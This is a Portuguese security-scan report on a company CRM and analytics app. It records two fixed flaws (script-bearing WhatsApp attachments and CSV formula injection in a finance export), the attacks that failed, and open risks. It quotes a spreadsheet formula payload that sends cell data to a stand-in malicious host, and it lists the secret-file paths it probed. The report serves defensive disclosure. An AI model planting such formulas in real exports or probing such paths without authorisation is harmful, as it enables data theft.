# Varredura de segurança — 28/11/2026 (CRM, dados e Intelligence)

Pedido: tentar de várias formas acessar o CRM, os dados e o Intelligence,
encontrar as falhas e corrigi-las.

## Como foi feito

- **Ataques numa cópia local** (mesmo código, banco de teste, Meta falsa).
  Nada de força bruta nem de escrita na produção.
- **Produção (www.legadoenterprise.com.br): só leitura.** Cerca de 50
  requisições comuns, sem login, sem tentar senhas e sem gravar nada.
- **Leitura do código** procurando injeção de SQL, XSS, acesso a registro
  alheio (IDOR), upload, SSRF, CSRF, redirecionamento aberto e vazamento de
  segredos.
- Os ataques viraram um teste automático que roda no CI de todo PR:
  `tests/suites/pentest.api.mjs` (`bash tests/run.sh pentest-api`).

## Falhas encontradas e corrigidas

### 1. Arquivo enviado por WhatsApp podia rodar código no CRM — **Alta**

**Como funcionava o ataque:** qualquer pessoa que mande mensagem para o
número do CRM pode enviar um "documento" HTML ou SVG com um script dentro. O
CRM servia esse arquivo pelo próprio endereço (`/api/crm/media/...`) com o
tipo escolhido pelo remetente. Se alguém da equipe abrisse o anexo, o script
rodaria com a sessão dessa pessoa: poderia ler contatos, conversas e
propostas, ou agir em nome dela. Confirmado na cópia local: o arquivo saía
como `text/html`.

**Correção** (`src/lib/media-headers.ts`, rota de mídia, `next.config.ts`):

- só fotos (JPEG, PNG, GIF, WebP, AVIF, BMP), áudio e vídeo abrem no
  navegador;
- qualquer outro tipo (HTML, SVG, PDF, desconhecido) vira download
  (`application/octet-stream`, `attachment`);
- toda resposta vai com `nosniff` e uma política `sandbox` que impede
  scripts e acesso à sessão, mesmo que o navegador tente exibir o arquivo;
- os anexos de contato (`/api/crm/files/...`), que já eram só download e já
  recusavam HTML/SVG no envio, ganharam a mesma blindagem.

### 2. Exportação do Financeiro aceitava fórmulas de planilha — **Média**

**Como funcionava o ataque:** um nome de empresa como
`=HYPERLINK("http://site-malicioso/?"&A1;"clique")` ia para o CSV do
Financeiro sem tratamento. Aberto no Excel ou no Google Planilhas, vira
fórmula: pode vazar dados da planilha ou levar a um site falso. As outras
exportações já tratavam isso; o Financeiro tinha uma cópia própria sem a
proteção.

**Correção:** o Financeiro passa a usar a mesma função das outras
exportações (`toCsvCell` em `src/lib/csv.ts`). Células que começam com
`= + - @`, tabulação ou quebra de linha recebem um `'` na frente. Números
comuns (`-15,00`) continuam números.

## Reforços (não eram falhas exploráveis)

- **Tokens de login:** o token da etapa "senha certa, falta o 2FA" e o
  token de sessão usam a mesma chave. Agora cada verificação também confere
  o formato do conteúdo: um não serve como o outro, em nenhuma camada.
- **Teste de cabeçalhos:** o teste automático verifica `X-Frame-Options`,
  `frame-ancestors`, `nosniff` e `Referrer-Policy`.

## O que foi atacado e aguentou

| Tentativa | Resultado |
| --- | --- |
| 142 rotas × 5 métodos (705 chamadas) sem login | Todas recusadas (401/403/404/405). Exceção esperada: o registro de "visualizou a proposta", que não grava nada com código inventado |
| Cookie de sessão inventado, adulterado, assinado com outra chave ou vencido | Recusado |
| Token do 2FA usado como sessão, e vice-versa | Recusado |
| Login de **cliente** do Intelligence chamando rotas do CRM e de administração | 403 |
| Cliente tentando criar um administrador | 403 |
| Gestor ou Comercial promovendo o próprio perfil | 403 |
| Comercial editando lead, nota, mensagem, negócio ou tarefa de outro vendedor | 403 (pode consultar, não mexer: é a regra combinada) |
| Comercial pedindo o Financeiro, o Painel ou a produtividade **de outra pessoa** (`owner=` na URL) | O servidor ignora e devolve só os números dele |
| Comercial em auditoria, equipe, redefinir senha, encerrar sessões, automações, personalização, metas, exportar, distribuir carteira, importar, campanhas, ligação com o Intelligence | 403 |
| Gestor redefinindo a senha do Administrador ou mudando perfis | 403 |
| Isolamento de clientes no Intelligence | Cliente só vê as próprias contas de anúncio; lista vazia não vira "todas" |
| Mídia com `../` no caminho | 403/404 |
| Webhook do WhatsApp sem assinatura ou com assinatura falsa; token de verificação chutado | 401/403 |
| Rotas agendadas (cron) sem a chave ou com chave chutada | 401/503 |
| Proposta com código inventado (PDF, aceite, recusa) | 404/400, nada gravado |
| Injeção de SQL | Todas as consultas parametrizadas; o que entra no texto do SQL é fixo ou numérico |
| XSS por dados do lead ou do cliente | React escapa tudo; o único `dangerouslySetInnerHTML` é o JSON-LD fixo do site |
| Links vindos de fora (site da empresa, anúncio de origem) | Só `http(s)`; `javascript:` não vira link |
| Redirecionamento depois do login | Só para páginas internas (`safeDestination`) |
| Fazer o servidor buscar um endereço escolhido pelo atacante (SSRF) | O servidor só chama endereços fixos (Meta e Anthropic); a mídia só é buscada para ids que chegaram em mensagens assinadas pela Meta |
| CSRF | Cookies `HttpOnly`, `Secure`, `SameSite=Lax`; a API não libera CORS para outros sites |
| Dependências | `npm audit`: 0 falhas |

## Verificações na produção (só leitura)

- Todas as rotas da API testadas sem login respondem 401/403/404, e
  `/crm` e `/intelligence` levam ao login.
- `/.env`, `/.env.local`, `/.git/config`, `/.git/HEAD`, `package.json`,
  `next.config.ts`, `docs/` e `tests/`: 404. Sem mapas de código-fonte.
- Os arquivos JavaScript públicos (site, login do CRM e do Intelligence)
  não contêm chaves da Meta, da Anthropic, do banco nem segredos de sessão.
- HTTPS obrigatório (`http` → `https`, 308), HSTS de 2 anos,
  `X-Frame-Options: DENY`, `frame-ancestors 'none'`, `nosniff`,
  `Referrer-Policy`. O servidor não se identifica além de "Vercel".
- A CORS da API não responde a outros sites. O `Access-Control-Allow-Origin: *`
  das páginas públicas é padrão da Vercel e não envia cookies.
- As rotas agendadas (`/api/cron/...`) respondem "não configurada": falta
  criar o `CRON_SECRET`, pendência já registrada em `docs/seguranca.md`. A
  rota fica fechada enquanto isso; não é uma brecha.

## O que continua em aberto (depende de decisão, não de código)

| Risco | Por que importa | O que resolve |
| --- | --- | --- |
| Limite de tentativas de login por instância do servidor | Um ataque distribuído tem mais tentativas do que as 5 por IP | Contador compartilhado (Upstash/Redis) |
| 2FA obrigatório só para Administradores | Senha vazada de um Gestor ou Comercial dá acesso à carteira dele | Exigir 2FA de todos, ou pelo menos dos Gestores |
| Sem CSP completa nas páginas | Seria uma segunda barreira se um dia surgir um XSS | CSP com `nonce`, um projeto à parte com testes de cada tela |
| HSTS sem `includeSubDomains`/`preload` | Subdomínios podem ser acessados por `http` na primeira visita | Ativar depois de conferir que todo subdomínio tem HTTPS |
| Backups no plano Free do Neon; Vercel Hobby | Restauração limitada; uso comercial fora dos termos | Decisão de plano (adiada pelo usuário) |
| Sem antivírus nos anexos | Um PDF ou Office malicioso pode ser baixado pela equipe | Tratar anexos de terceiros com o cuidado habitual; antivírus é serviço pago |
| LGPD | Registro formal ainda não validado | Revisão do jurídico |

## Como repetir

```bash
bash tests/run.sh pentest-api      # só os ataques
bash tests/run.sh                  # bateria completa (inclui os ataques)
```
